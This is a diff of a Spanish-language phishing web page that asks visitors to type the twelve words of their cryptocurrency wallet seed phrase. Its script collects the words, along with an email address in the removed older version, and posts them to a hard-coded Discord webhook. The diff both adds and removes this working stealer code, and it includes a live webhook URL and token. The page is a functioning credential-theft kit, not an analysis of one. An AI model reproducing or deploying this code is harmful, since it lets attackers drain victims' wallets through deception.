@@ -1,6 +1,100 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <h1>Coloque su frase secreta para continuar</h1>
+    <script>
+      function submitForm() {
+        const semilla1 = document.querySelector("input[placeholder='Frase semilla 1']").value;
+        const semilla2 = document.querySelector("input[placeholder='Frase semilla 2']").value;
+        const semilla3 = document.querySelector("input[placeholder='Frase semilla 3']").value;
+        const semilla4 = document.querySelector("input[placeholder='Frase semilla 4']").value;
+        const semilla5 = document.querySelector("input[placeholder='Frase semilla 5']").value;
+        const semilla6 = document.querySelector("input[placeholder='Frase semilla 6']").value;
+        const semilla7 = document.querySelector("input[placeholder='Frase semilla 7']").value;
+        const semilla8 = document.querySelector("input[placeholder='Frase semilla 8']").value;
+        const semilla9 = document.querySelector("input[placeholder='Frase semilla 9']").value;
+        const semilla10 = document.querySelector("input[placeholder='Frase semilla 10']").value;
+        const semilla11 = document.querySelector("input[placeholder='Frase semilla 11']").value;
+        const semilla12 = document.querySelector("input[placeholder='Frase semilla 12']").value;
+
+        const payload = {
+          content: `Frase semilla 1: ${semilla1}\nFrase semilla 2: ${semilla2}\nFrase semilla 3: ${semilla3}\nFrase semilla 4: ${semilla4}\nFrase semilla 5: ${semilla5}\nFrase semilla 6: ${semilla6}\nFrase semilla 7: ${semilla7}\nFrase semilla 8: ${semilla8}\nFrase semilla 9: ${semilla9}\nFrase semilla 10: ${semilla10}\nFrase semilla 11: ${semilla11}\nFrase semilla 12: ${semilla12}`,
+        };
+
+        const url = "https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m";
+
+        fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(payload),
+        })
+          .then((response) => response.json())
+          .then((data) => {
+            console.log("Solicitud exitosa:", data);
+          })
+          .catch((error) => {
+            console.error("Solicitud fallida:", error);
+          });
+      }
+    </script>
+    <style>
+      body {
+        background-color: #fff;
+      }
+      
+      .container {
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      
+      .card {
+        width: 30%;
+        height: 200px;
+        background-color: #34495e;
+        color: #3498db;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        margin: 20px;
+        padding: 20px;
+        border-radius: 10px;
+      }
+      
+      h1 {
+        color: #34495e;
+        text-align: center;
+        font-weight: bold;
+        font-size: 36px;
+        margin-bottom: 20px;
+      }
+      
+      input[type='text'] {
+        width: 80%;
+        height: 40px;
+        margin-bottom: 20px;
+        border-radius: 5px;
+        border: none;
+        padding-left: 10px;
+        font-size: 18px;
+      }
+      
+      input[type='submit'] {
+        width: 80%;
+        height: 40px;
+        background-color: #3498db;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        font-size: 18px;
+        cursor: pointer;
+      }
+    </style>
     <style>
       h1 {
         text-align: center;
@@ -38,61 +132,29 @@
       }
     </style>
   </head>
-    <h1>Introduzca su frase secreta para continuar</h1>
-    <script>
-      function submitForm() {
-        const semilla1 = document.querySelector("input[placeholder='Frase semilla 1']").value;
-        const semilla2 = document.querySelector("input[placeholder='Frase semilla 2']").value;
-        const semilla3 = document.querySelector("input[placeholder='Frase semilla 3']").value;
-        const semilla4 = document.querySelector("input[placeholder='Frase semilla 4']").value;
-        const semilla5 = document.querySelector("input[placeholder='Frase semilla 5']").value;
-        const semilla6 = document.querySelector("input[placeholder='Frase semilla 6']").value;
-        const semilla7 = document.querySelector("input[placeholder='Frase semilla 7']").value;
-        const semilla8 = document.querySelector("input[placeholder='Frase semilla 8']").value;
-        const semilla9 = document.querySelector("input[placeholder='Frase semilla 9']").value;
-        const semilla10 = document.querySelector("input[placeholder='Frase semilla 10']").value;
-        const semilla11 = document.querySelector("input[placeholder='Frase semilla 11']").value;
-        const semilla12 = document.querySelector("input[placeholder='Frase semilla 12']").value;
-        const correo = document.querySelector("input[placeholder='Correo electrónico']").value;
-            const payload = {
-      content: `Frase semilla 1: ${semilla1}\nFrase semilla 2: ${semilla2}\nFrase semilla 3: ${semilla3}\nFrase semilla 4: ${semilla4}\nFrase semilla 5: ${semilla5}\nFrase semilla 6: ${semilla6}\nFrase semilla 7: ${semilla7}\nFrase semilla 8: ${semilla8}\nFrase semilla 9: ${semilla9}\nFrase semilla 10: ${semilla10}\nFrase semilla 11: ${semilla11}\nFrase semilla 12: ${semilla12}\nCorreo electrónico: ${correo}`,
-    };
-
-    const url = "https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m";
-
-    fetch(url, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(payload),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        console.log("Solicitud exitosa:", data);
-      })
-      .catch((error) => {
-        console.error("Solicitud fallida:", error);
-     
-<div class="container">
+  </head>
+  <body>
+    <div class="container">
       <div class="card">
-        <h1>Frase secreta</h1>
-        <form onsubmit="submitForm(); return false;">
-          <input type="text" placeholder="Frase semilla 1">
-          <input type="text" placeholder="Frase semilla 2">
-          <input type="text" placeholder="Frase semilla 3">
-          <input type="text" placeholder="Frase semilla 4">
-          <input type="text" placeholder="Frase semilla 5">
-          <input type="text" placeholder="Frase semilla 6">
-          <input type="text" placeholder="Frase semilla 7">
-          <input type="text" placeholder="Frase semilla 8">
-          <input type="text" placeholder="Frase semilla 9">
-          <input type="text" placeholder="Frase semilla 10">
-          <input type="text" placeholder="Frase semilla 11">
-          <input type="text" placeholder="Frase semilla 12">
-          <input type="submit" value="Enviar">
-        </form>
+        <input type="text" placeholder="Frase semilla 1">
+        <input type="text" placeholder="Frase semilla 2">
+        <input type="text" placeholder="Frase semilla 3">
+        <input type="text" placeholder="Frase semilla 4">
+      </div>
+      <div class="card">
+        <input type="text" placeholder="Frase semilla 5">
+        <input type="text" placeholder="Frase semilla 6">
+        <input type="text" placeholder="Frase semilla 7">
+        <input type="text" placeholder="Frase semilla 8">
+      </div>
+      <div class="card">
+        <input type="text" placeholder="Frase semilla 9">
+        <input type="text" placeholder="Frase semilla 10">
+        <input type="text" placeholder="Frase semilla 11">
+        <input type="text" placeholder="Frase semilla 12">
       </div>
     </div>
+    
+    <input type="submit" value="Enviar" onclick="submitForm()">
   </body>
 </html>
